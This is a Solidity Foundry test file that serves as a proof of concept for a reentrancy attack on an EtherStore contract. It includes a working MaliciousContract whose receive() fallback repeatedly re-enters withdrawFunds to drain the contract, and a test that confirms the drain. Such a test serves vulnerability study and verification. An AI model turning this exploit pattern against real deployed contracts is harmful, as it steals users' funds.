// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherstore.sol";

contract MaliciousContract {
    EtherStore public etherStore;
    uint256 public attackAmount;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attack() external payable {
        attackAmount = msg.value;
        // Deposit funds to appear as legitimate user
        etherStore.depositFunds{value: msg.value}();
        // Start the attack by withdrawing
        etherStore.withdrawFunds(msg.value);
    }

    // Fallback function called when Ether is sent to this contract
    receive() external payable {
        if (address(etherStore).balance >= attackAmount) {
            // Re-entering the EtherStore contract
            etherStore.withdrawFunds(attackAmount);
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract EtherStoreTest is Test {
    EtherStore public etherStore;
    MaliciousContract public attacker;
    address public owner = address(1);
    address public user = address(2);
    address public attackerAddress = address(3);

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user, 10 ether);
        vm.deal(attackerAddress, 10 ether);

        vm.prank(owner);
        etherStore = new EtherStore();

        // Deploy attacker contract
        vm.prank(attackerAddress);
        attacker = new MaliciousContract(address(etherStore));
    }

    function testReentrancyAttack() public {
        // Legitimate user deposits funds
        vm.prank(user);
        etherStore.depositFunds{value: 5 ether}();

        // Check initial balances
        assertEq(etherStore.getUserBalance(user), 5 ether);
        assertEq(etherStore.getContractBalance(), 5 ether);

        // Fast forward time to pass the 1 week withdrawal cooldown
        vm.warp(block.timestamp + 1 weeks);

        console.log("--- BEFORE-Trigger State ---");
        uint256 beforeEtherStoreBalance = etherStore.getContractBalance();
        uint256 beforeAttackerBalance = attacker.getBalance();
        console.log("EtherStore contract balance:", beforeEtherStoreBalance);
        console.log("Attacker contract balance:", beforeAttackerBalance);

        console.log("--- Trigger Attack ---");
        vm.prank(attackerAddress);
        attacker.attack{value: 1 ether}();

        console.log("--- AFTER-Trigger State ---");
        uint256 afterEtherStoreBalance = etherStore.getContractBalance();
        uint256 afterAttackerBalance = attacker.getBalance();
        console.log("EtherStore contract balance:", afterEtherStoreBalance);
        console.log("Attacker contract balance:", afterAttackerBalance);

        // Differential validation
        console.log("--- Differential Results ---");
        console.log("EtherStore balance change:", int256(afterEtherStoreBalance) - int256(beforeEtherStoreBalance));
        console.log("Attacker balance change:", afterAttackerBalance - beforeAttackerBalance);
        
        bool attackSucceeded = (beforeAttackerBalance + 5 ether < afterAttackerBalance) && 
                               (beforeEtherStoreBalance - 5 ether > afterEtherStoreBalance);
        
        // Final verdict
        if (attackSucceeded) {
            console.log("Vulnerability Exists: Attacker successfully drained funds via reentrancy");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed");
        }

        // Original assertions (maintained for backward compatibility)
        assertGt(attacker.getBalance(), 5 ether);
        assertLt(etherStore.getContractBalance(), 1 ether);
    }
}